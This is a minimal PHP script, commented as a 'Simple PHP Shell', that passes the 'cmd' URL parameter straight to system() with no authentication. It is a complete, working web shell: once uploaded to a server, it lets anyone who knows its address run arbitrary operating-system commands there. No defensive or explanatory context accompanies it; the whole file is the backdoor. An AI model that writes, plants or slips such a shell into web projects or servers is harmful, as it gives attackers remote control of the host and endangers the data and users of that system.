<?php
// Simple PHP Shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
